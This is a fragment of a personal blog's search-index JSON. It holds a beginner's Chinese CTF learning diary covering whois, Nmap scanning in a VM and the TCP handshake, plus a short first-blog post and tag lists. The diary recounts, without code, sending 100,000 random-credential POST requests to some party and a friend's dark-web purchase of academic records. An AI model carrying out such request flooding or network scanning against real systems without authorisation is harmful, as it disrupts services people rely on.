写了一个脚本给对方发送了100000个post请求 参数是随机生成的QQ号和密码这就变得很有趣了。 我与暗网暗网警告！与我较好的一位”伙伴“，三年前在暗网用0.0*个比特币购买到了自己大学本科、研究生的学籍信息 （包括GPA、甚至选课信息等等）。 所以所以这些经历使我产生许多兴趣，加入了CTF。希望能成为一门白客 为安全事业贡献一份力。 入门whois查询emmmm，就查一下域名信息啥的，之前在新网等域名托管商注册个人域名也要求填本人的个人信息。 Nmap网络扫描遇到没遇到过的专业技能了 TCP三次握手看来需要先学习基础的理论说到三次握手 我想到了http与https，我想我需要再了解一下 HTTP/HTTPS相对于HTTP，HTTPS更安全，这里有关CA证书、有关RSA，在这里不再赘述。在这里贴上链接。这里附上”三次握手“细节详解。 Zenmap图形基本应用就是有点像”假黑客“学习一些基础的内容，新建了的模拟机，在模拟机里面进行一系列的扫描。包括整网段的扫描等。但是问题又来了，这只是在理想环境的测试，那在真实的环境下呢？在具有防火墙、具有过滤拦截下的渗透又是怎么样的呢？需要等待明天解答。 nmap命令行的使用看了很多工具的使用，接触到如SYN\\ACK等不会的名词。玩完命令行觉得：要走的路还好长好长顺便把命令行的语法格式学了一下 写在后面觉得这样的学习 和实操还有很远 CTF更多的我认为应该是实操在后面，我想我需要通过更多的实操，去提供水平，同时也要有基础储备。希望多天后的我，看到上面自己写的东西，会觉得幼稚。","categories":[{"name":"CTF求生之路","slug":"CTF求生之路","permalink":"http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"}],"tags":[]},{"title":"favorhau的第一篇博客","slug":"favorhau的第一篇博客","date":"2020-12-04T14:59:01.000Z","updated":"2020-12-04T15:14:06.000Z","comments":true,"path":"2020/12/04/favorhau的第一篇博客/","link":"","permalink":"http://favorhau.github.io/2020/12/04/favorhau%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/","excerpt":"第一条博客写一下感受 广州的冬天 风刺骨 很冷关于博客搭建：感谢好友situ介绍的工具与文档让我少走弯路","text":"第一条博客写一下感受 广州的冬天 风刺骨 很冷关于博客搭建：感谢好友situ介绍的工具与文档让我少走弯路 五年前用过很多集成化的搭建部署VPS五年后看到了 node.js的强大。作为一个“网站爱好者”，从中学到大学，即使想讲也把所识过的字用完。","categories":[{"name":"favorhau","slug":"favorhau","permalink":"http://favorhau.github.io/categories/favorhau/"}],"tags":[]}],"categories":[{"name":"restful api","slug":"restful-api","permalink":"http://favorhau.github.io/categories/restful-api/"},{"name":"api","slug":"restful-api/api","permalink":"http://favorhau.github.io/categories/restful-api/api/"},{"name":"后端","slug":"restful-api/api/后端","permalink":"http://favorhau.github.io/categories/restful-api/api/%E5%90%8E%E7%AB%AF/"},{"name":"服务器","slug":"服务器","permalink":"http://favorhau.github.io/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"cookies","slug":"服务器/cookies","permalink":"http://favorhau.github.io/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/cookies/"},{"name":"CTF求生之路","slug":"CTF求生之路","permalink":"http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"},{"name":"教程","slug":"教程","permalink":"http://favorhau.github.io/categories/%E6%95%99%E7%A8%8B/"},{"name":"码农日常","slug":"码农日常","permalink":"http://favorhau.github.io/categories/%E7%A0%81%E5%86%9C%E6%97%A5%E5%B8%B8/"},{"name":"favorhau","slug":"favorhau","permalink":"http://favorhau.github.io/categories/favorhau/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://favorhau.github.io/tags/CTF/"},{"name":"apache","slug":"apache","permalink":"http://favorhau.github.io/tags/apache/"},{"name":"服务器搭建","slug":"服务器搭建","permalink":"http://favorhau.github.io/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"},{"name":"Web","slug":"Web","permalink":"http://favorhau.github.io/tags/Web/"},{"name":"正则匹配","slug":"正则匹配","permalink":"http://favorhau.github.io/tags/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://favorhau.github.io/tags/BUUCTF/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://favorhau.github.io/tags/JavaScript/"},{"name":"数据库","slug":"数据库","permalink":"http://favorhau.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"马赛克","slug":"马赛克","permalink":"http://favorhau.github.io/tags/%E9%A9%AC%E8%B5%9B%E5%85%8B/"},{"name":"SQL","slug":"SQL","permalink":"http://favorhau.github.io/tags/SQL/"},{"name":"PHP","slug":"PHP","permalink":"http://favorhau.github.io/tags/PHP/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://favorhau.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"cryto","slug":"cryto","permalink":"http://favorhau.github.io/tags/cryto/"}]}